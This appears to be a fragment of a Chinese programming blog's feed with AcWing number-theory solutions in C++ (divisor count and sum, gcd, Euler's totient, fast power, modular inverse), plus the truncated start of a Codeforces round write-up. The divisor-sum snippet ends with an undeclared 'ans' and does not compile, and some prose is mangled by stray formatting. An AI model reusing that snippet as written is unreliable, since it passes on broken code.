class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i++) &#123;</span><br><span class="line">      <span class="keyword">while</span> (x % i == <span class="number">0</span>) &#123;</span><br><span class="line">        x /= i;</span><br><span class="line">        cnt[i]++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">1</span>)      <span class="comment">//n也是一个质因子</span></span><br><span class="line">      cnt[x]++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> c : cnt) &#123;</span><br><span class="line">       <span class="comment">//res = (x1+1)(x2+1)(x3+1)…(xk+1)</span></span><br><span class="line">    ans = ans * (c.second + <span class="number">1</span>) % mod;</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="871-约数求和"><a href="#871-约数求和" class="headerlink" title="871. 约数求和"></a>871. 约数求和</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730174531131.png" alt="image-20240730174531131"></p><script type="math/tex; mode=display">[\text{约数之和} = \left( \sum_{i=0}^{c_1} p_1^i \right) \cdot \left( \sum_{i=0}^{c_2} p_2^i \right) \cdots \left( \sum_{i=0}^{c_k} p_k^i \right)]</script><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LL long long</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i++) &#123;</span><br><span class="line">      <span class="keyword">while</span> (x % i == <span class="number">0</span>) &#123;</span><br><span class="line">        x /= i;</span><br><span class="line">        cnt[i]++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">1</span>)      <span class="comment">//n也是一个质因子</span></span><br><span class="line">      cnt[x]++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> p : cnt)</span><br><span class="line">    &#123;</span><br><span class="line">        LL a = p.first, b = p.second;</span><br><span class="line">        LL t = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (b -- ) t = (t * a + <span class="number">1</span>) % mod;</span><br><span class="line">        <span class="comment">//t = 1   t = p + 1   t = p^2 + p + 1</span></span><br><span class="line">        res = res * t % mod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="872-最大公约数"><a href="#872-最大公约数" class="headerlink" title="872. 最大公约数"></a>872. 最大公约数</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730174910475.png" alt="image-20240730174910475"></p><p>欧几里得算法（辗转相除法）：</p><p>(a， b) = (a % b， b) = （b, a %b）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span>? a : <span class="built_in">gcd</span>(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, a, b;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">gcd</span>(a,b) &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><h4 id="873-欧拉函数"><a href="#873-欧拉函数" class="headerlink" title="873. 欧拉函数"></a>873. 欧拉函数</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240731140834893.png" alt="image-20240731140834893"></p><p>如果 (n) 的质因数分解为：</p><script type="math/tex; mode=display">[ n = p_1^{k_1} \times p_2^{k_2} \times \cdots \times p_m^{k_m} ]</script><p>那么，欧拉函数可以表示为：</p><script type="math/tex; mode=display">[ \varphi(n) = n \left(1 - \frac{1}{p_1}\right)\left(1 - \frac{1}{p_2}\right) \cdots \left(1 - \frac{1}{p_m}\right) ]</script><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span>  N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="type">int</span> res = n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n / i; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n % i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// res*=(p - 1) / p</span></span><br><span class="line">            res = res / i * (i - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span>(n % i == <span class="number">0</span>)   <span class="comment">//对n约分</span></span><br><span class="line">            &#123;</span><br><span class="line">                n /= i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果有剩余，则剩余是个质因子</span></span><br><span class="line">    <span class="keyword">if</span>(n &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        res = res / n * (n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt;res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="874-筛法求欧拉函数"><a href="#874-筛法求欧拉函数" class="headerlink" title="874. 筛法求欧拉函数"></a>874. 筛法求欧拉函数</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240731143733273.png" alt="image-20240731143733273"></p><p><a href="https://www.acwing.com/solution/content/3952/">AcWing 874. 筛法求欧拉函数 - AcWing</a></p><p><a href="https://www.acwing.com/solution/content/145877/">AcWing 874. 筛法求欧拉函数 - AcWing</a></p><p>phi[primes[j] <em> i]分为两种情况：<br>① i % primes[j] == 0时：primes[j]是i的最小质因子，也是primes[j] </em> i的最小质因子，因此1 - 1 / primes[j]这一项在phi[i]中计算过了，只需将基数N<br>𝑁<br>修正为primes[j]倍，最终结果为phi[i] <em> primes[j]。<br>② i % primes[j] != 0：primes[j]不是i的质因子，只是primes[j] </em> i的最小质因子，因此不仅需要将基数N<br>𝑁<br>修正为primes[j]倍，还需要补上1 - 1 / primes[j]这一项，因此最终结果phi[i] * (primes[j] - 1)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> primes[N], cnt;</span><br><span class="line"><span class="type">int</span> phi[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_eulers</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  phi[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!st[i]) &#123;</span><br><span class="line">      primes[cnt++] = i;</span><br><span class="line">      phi[i] = i - <span class="number">1</span>; <span class="comment">// 若为质数，有i - 1个数与其互质</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; primes[j] &lt;= n / i; j++) &#123;</span><br><span class="line">      st[primes[j] * i] = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>) <span class="comment">//最小质因子</span></span><br><span class="line">      &#123;</span><br><span class="line">        phi[primes[j] * i] = phi[i] * primes[j];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">  当p[j]是i的一个约数时,i的质因数与p[j]*i的质因数完全相同。</span></span><br><span class="line"><span class="comment">  i      = (p1^a1)*(p2^a2)*(p3^a3)*...(p[j]^ap[j])...(pk^ak)</span></span><br><span class="line"><span class="comment">  i*p[j] = (p1^a1)*(p2^a2)*(p3^a3)*...(p[j]^(ap[j]+1))...(pk^ak)</span></span><br><span class="line"><span class="comment">  由欧拉函数的定义可知：</span></span><br><span class="line"><span class="comment">  Φ(i)      =  i   * (1-1/p1)*(1-1/p2)*(1-1/p3)*...(1-1/p[j])*...(1-1/pk)</span></span><br><span class="line"><span class="comment">  Φ(i*p[j]) = i*p[j]*(1-1/p1)*(1-1/p2)*(1-1/p3)*...(1-1/p[j])*...(1-1/pk)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">当i%p[j]!=0时，p[j]不是i的约数，i与i*p[j]的质因子相差一个p[j]</span></span><br><span class="line"><span class="comment">i      = (p1^a1)*(p2^a2)*(p3^a3)*...(pk^ak)</span></span><br><span class="line"><span class="comment">i*p[j] = (p1^a1)*(p2^a2)*(p3^a3)*...(pk^ak)*(p[j]^ap[j])</span></span><br><span class="line"><span class="comment">所以由欧拉函数的定义可知：</span></span><br><span class="line"><span class="comment">Φ(i)      =  i    *(1-1/p1)*(1-1/p2)*(1-1/p3)*...(1-1/pk)</span></span><br><span class="line"><span class="comment">Φ(i*p[j]) = i*p[j]*(1-1/p1)*(1-1/p2)*(1-1/p3)*...(1-1/pk)(1-1/p[j])</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">      phi[primes[j] * i] = phi[i] * (primes[j] - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_eulers</span>(n);</span><br><span class="line"></span><br><span class="line">  LL res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    res += phi[i];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>欧拉定理是数论中的一个重要定理，它描述了在模 (m) 的整数环中，与 (m) 互质的整数 (a) 和 (m) 的欧拉函数 (\varphi(m)) 之间的关系。以下是欧拉定理的表述：<br>如果 (m) 是一个正整数，(a) 是一个与 (m) 互质的正整数，那么 (a^{\varphi(m)} \equiv 1 \pmod{m})。<br>其中，(\varphi(m)) 表示小于或等于 (m) 的与 (m) 互质的正整数的个数，这个函数被称为欧拉函数。<br>以下是欧拉定理的Markdown格式表示：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 欧拉定理</span></span><br><span class="line">欧拉定理是数论中的一个基本定理，其内容如下：</span><br><span class="line">如果 \( m \) 是一个正整数，\( a \) 是一个与 \( m \) 互质的正整数，那么：</span><br><span class="line">\[ a^&#123;\varphi(m)&#125; \equiv 1 \pmod&#123;m&#125; \]</span><br><span class="line">这里，\(\varphi(m)\) 是欧拉函数，表示小于或等于 \( m \) 的与 \( m \) 互质的正整数的个数。</span><br></pre></td></tr></table></figure><br>当你将上述Markdown文本放入支持Markdown的编辑器中时，它将被渲染为格式化的文本，如下所示：</p><h4 id="欧拉定理和费马丁柳"><a href="#欧拉定理和费马丁柳" class="headerlink" title="欧拉定理和费马丁柳"></a>欧拉定理和费马丁柳</h4><p><strong>欧拉定理：</strong><br>如果 ( m ) 是一个正整数，( a ) 是一个与 ( m ) 互质的正整数</p><p>那么：<script type="math/tex">a^{\varphi(m)} \equiv 1 \pmod{m}</script></p><p><strong>费马小定理</strong>:<br>如果 ( p ) 是一个素数（有p-1个数与其互质），而 ( a ) 是一个不被 ( p ) 整除的整数，那么：</p><script type="math/tex; mode=display">a^{p-1} \equiv 1 \pmod{p}</script><h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><h4 id="875-快速幂"><a href="#875-快速幂" class="headerlink" title="875. 快速幂"></a>875. 快速幂</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240731163555919.png" alt="image-20240731163555919"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;                            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> k, <span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(k &amp; <span class="number">1</span>) res = (LL)res * a % p;<span class="comment">//注意转型，因为我们传入的类型为int</span></span><br><span class="line">        k = k &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//更新a,a依次为a^&#123;2^0&#125;,a^&#123;2^1&#125;,a^&#123;2^2&#125;,....,a^&#123;2^logb&#125;</span></span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, k , p;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; k &gt;&gt; p;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">qmi</span>(a, k, p) &lt;&lt; endl;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="876-快速幂求逆元"><a href="#876-快速幂求逆元" class="headerlink" title="876. 快速幂求逆元"></a>876. 快速幂求逆元</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240731165819398.png" alt="image-20240731165819398">费马定理+快速幂</p><p><a href="https://www.acwing.com/solution/content/3054/">AcWing 876. 快速幂求逆元 - AcWing</a></p><p>a / b ≡ a <em> x (mod n)<br>两边同乘b可得 a ≡ a </em> b <em> x (mod n)<br>即 1 ≡ b </em> x (mod n)<br>同 b <em> x ≡ 1 (mod n)<br>由费马小定理可知，当n为质数时<br>b ^ (n - 1) ≡ 1 (mod n)<br>拆一个b出来可得 b </em> b ^ (n - 2) ≡ 1 (mod n)<br>故当n为质数时，b的乘法逆元 x = b ^ (n - 2)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;                            </span><br><span class="line"></span><br><span class="line"><span class="comment">//a^k%p</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> k, <span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res  = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(k &amp; <span class="number">1</span>) res = (LL)res * a % p;</span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, p;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; p;</span><br><span class="line">        <span class="type">int</span> res = <span class="built_in">qmi</span>(a, p - <span class="number">2</span>, p);</span><br><span class="line">        <span class="keyword">if</span>(a % p)  cout &lt;&lt; res &lt;&lt; endl;<span class="comment">//互质存在逆元</span></span><br><span class="line">        <span class="keyword">else</span> cout &lt;&lt;<span class="string">&quot;impossible&quot;</span>&lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拓展欧几里得算法"><a href="#拓展欧几里得算法" class="headerlink" title="拓展欧几里得算法"></a>拓展欧几里得算法</h3>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pinely Round 4 (Div. 1 + Div. 2)</title>
      <link href="/2024/07/28/codeforce/2024_7_28/"/>
      <url>/2024/07/28/codeforce/2024_7_28/</url>
      
        <content type="html"><![CDATA[<h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730003845584.png" alt="image-20240730003845584"></p><blockquote><p> 题意：通过多次删除相邻的两个元素，最终剩下的一个元素的最大可能值。由于数组的长度是奇数，最终总会剩下一个元素。求剩余元素的最大值</p></blockquote><p>可以发现一个数左右数的个数为偶数时，可以删除到只剩该元素，且左边为偶数，则右边为偶数，因此我们只需找出最大值的位置，判断其位置是否为奇数位。</p><ul><li><p>是，则输出其</p></li><li><p>否，则置0，再次寻找最大数</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> arr[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  cin &gt;&gt; num;</span><br><span class="line">  <span class="type">int</span> maxpos = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> maxnum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">    cin &gt;&gt; arr[i];</span><br><span class="line">    <span class="keyword">if</span> 